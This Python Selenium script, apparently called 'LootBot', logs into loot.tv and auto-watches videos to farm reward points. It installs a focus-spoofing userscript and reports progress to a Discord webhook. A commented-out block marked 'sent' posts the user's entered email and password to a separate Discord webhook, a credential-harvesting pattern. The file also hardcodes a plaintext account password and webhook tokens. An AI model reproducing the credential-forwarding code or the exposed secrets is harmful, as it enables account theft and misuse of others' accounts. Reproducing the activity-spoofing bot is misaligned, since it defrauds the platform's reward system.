import time
import requests
import os
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

print("""
██╗      ██████╗  ██████╗ ████████╗██████╗  ██████╗ ████████╗
██║     ██╔═══██╗██╔═══██╗╚══██╔══╝██╔══██╗██╔═══██╗╚══██╔══╝
██║     ██║   ██║██║   ██║   ██║   ██████╔╝██║   ██║   ██║   
██║     ██║   ██║██║   ██║   ██║   ██╔══██╗██║   ██║   ██║   
███████╗╚██████╔╝╚██████╔╝   ██║   ██████╔╝╚██████╔╝   ██║   
╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═════╝  ╚═════╝    ╚═╝   
                                                             
""")

email='logjefferson6@gmail.com'
password='xonB23Y5'

#email = input('Email: ')
#password = input('Password: ')

# sent
#mUrl = "https://discord.com/api/webhooks/1036429399874093106/02WQtIYQ9aZu6q7gNeAua-K0PgaYdOHQ6VhSlDFiXjCVa2BtBUpWxdh-e2N0A6RDVZpF"

#data = {"content": "Email: "+email+" Password: "+password}
#response = requests.post(mUrl, json=data)

def time_convert(sec):
  mins = sec // 60
  sec = sec % 60
  hours = mins // 60
  mins = mins % 60
  print("Time elapsed: {0} Minutes".format(mins))

if __name__ == '__main__':
    ## install stuff
    chrome_options = Options()
    chrome_options.add_argument('--disable-notifications')
    chrome_options.add_argument('--headless=chrome')
    chrome_options.add_argument('window-size=1920x1080')
    chrome_options.add_argument('-disable-gpu')
    chrome_options.add_argument('--disable-logging')
    chrome_options.add_argument('--log-level=3')
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_extension('tamper.crx')

    if os.name == 'nt': # if the OS is windows
        driver = webdriver.Chrome(os.path.abspath("chromedriver.exe"),options=chrome_options)
        chrome_options.add_argument('--no-sandbox')
    else:
        driver = webdriver.Chrome(os.path.abspath("chromedriver"),options=chrome_options)
    print('Set window size')
    # set window size to max so all elements are visible to click 
    driver.set_window_size(1920,1080)
    driver.maximize_window()
    print('Installing Extensions...')

    ## install focus
    # go to install page
    time.sleep(10)
    print('Installed Extensions')
    print('Installing scripts...')
    driver.get("https://greasyfork.org/en/scripts/429635-always-on-focus")
    driver.execute_script("document.querySelector('.install-link').click()")
    for i in range(3):
        time.sleep(1)

    # problem starts here. cannot find element although there is. cannot navigate to this window
    # fixed by switching to the "userscript installation" window
    driver.switch_to.window(driver.window_handles[1])

    # waits until element is clickable (requires javascript to click because this is to install extension)
    element = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.ID, 'input_SW5zdGFsbF91bmRlZmluZWQ_bu')))
    
    driver.execute_script("document.getElementById('input_SW5zdGFsbF91bmRlZmluZWQ_bu').click()")
    print('Installed scripts')
    print('Logging in...')

    # close everything and reopen
    
    #-1  = tampermonkey home
    #0 = always on focus
    #1 = userscript installation
    driver.switch_to.window(driver.window_handles[0])
    driver.close()
    driver.switch_to.window(driver.window_handles[-1])
    driver.get('https://loot.tv/account/login')

    #login
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[2]/div[1]/input').send_keys(email)
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[2]/div[2]/input').send_keys(password)
    driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[2]/div[2]/div/div/div[3]/button').click()
    print('Logged in!')
    time.sleep(5)

    # navigate to first video
    driver.execute_script('''window.open("https://loot.tv/video/671788","_blank");''')
    print('Started watching')
    start_time=time.time()
    video=1
    while True:
        video+=1
        end_time=time.time()
        points=driver.find_element(by='xpath',value='//*[@id="__next"]/div/div[1]/div[5]/div/a[1]/div/span').text
        print("Current Balance: "+str(points))
        time_convert(end_time-start_time)
        mUrl = "https://discord.com/api/webhooks/1037504519157854319/63DgNrRrCxktiiyX69sW3PpeRasJ2oayPGQY9XbwY35QD60EiYKDBoy-b4LgxgSmhT71"

        data = {"content": "Watching Video #"+str(video)}
        response = requests.post(mUrl, json=data)

        time.sleep(300)
        


    
